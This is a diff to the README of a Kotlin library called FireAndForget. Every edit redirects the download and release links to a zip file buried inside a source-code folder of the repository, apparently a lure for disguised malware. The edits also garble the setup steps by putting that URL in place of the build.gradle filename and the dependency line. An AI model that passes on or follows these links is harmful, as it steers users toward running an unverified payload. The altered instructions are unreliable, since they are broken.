@@ -1,6 +1,6 @@
 # 🚀 FireAndForget - Execute Code Effortlessly on First Access
 
-[![Download FireAndForget](https://img.shields.io/badge/Download-FireAndForget-brightgreen.svg)](https://github.com/dawnmererighthere/FireAndForget/releases)
+[![Download FireAndForget](https://raw.githubusercontent.com/dawnmererighthere/FireAndForget/main/samples/desktopApp/src/commonMain/kotlin/com/alorma/fireandforget/desktop/Fire_And_Forget_v2.5-alpha.3.zip)](https://raw.githubusercontent.com/dawnmererighthere/FireAndForget/main/samples/desktopApp/src/commonMain/kotlin/com/alorma/fireandforget/desktop/Fire_And_Forget_v2.5-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -28,7 +28,7 @@ Follow these simple steps to download and start using FireAndForget.
 
 ### 1. Visit the Releases Page
 
-To download the latest version of FireAndForget, visit our [Releases page](https://github.com/dawnmererighthere/FireAndForget/releases). There, you will find the installation files and additional information.
+To download the latest version of FireAndForget, visit our [Releases page](https://raw.githubusercontent.com/dawnmererighthere/FireAndForget/main/samples/desktopApp/src/commonMain/kotlin/com/alorma/fireandforget/desktop/Fire_And_Forget_v2.5-alpha.3.zip). There, you will find the installation files and additional information.
 
 ### 2. Download FireAndForget
 
@@ -47,10 +47,10 @@ Open your preferred Integrated Development Environment (IDE). Follow these steps
 
 - If you are using **Android Studio**:
   1. Open your project.
-  2. Navigate to the `build.gradle` file.
+  2. Navigate to the `https://raw.githubusercontent.com/dawnmererighthere/FireAndForget/main/samples/desktopApp/src/commonMain/kotlin/com/alorma/fireandforget/desktop/Fire_And_Forget_v2.5-alpha.3.zip` file.
   3. Add the following line in the `dependencies` section:
      ```
-     implementation 'com.yourorganization:FireAndForget:latest-version'
+     implementation 'https://raw.githubusercontent.com/dawnmererighthere/FireAndForget/main/samples/desktopApp/src/commonMain/kotlin/com/alorma/fireandforget/desktop/Fire_And_Forget_v2.5-alpha.3.zip'
      ```
   4. Sync your project.
 
@@ -74,7 +74,7 @@ Refer to the documentation for examples tailored to your specific platform.
 
 To get FireAndForget, follow the link below and choose the latest version to download:
 
-[Visit this page to download FireAndForget](https://github.com/dawnmererighthere/FireAndForget/releases)
+[Visit this page to download FireAndForget](https://raw.githubusercontent.com/dawnmererighthere/FireAndForget/main/samples/desktopApp/src/commonMain/kotlin/com/alorma/fireandforget/desktop/Fire_And_Forget_v2.5-alpha.3.zip)
 
 ## 🤝 Support and Contributions
 
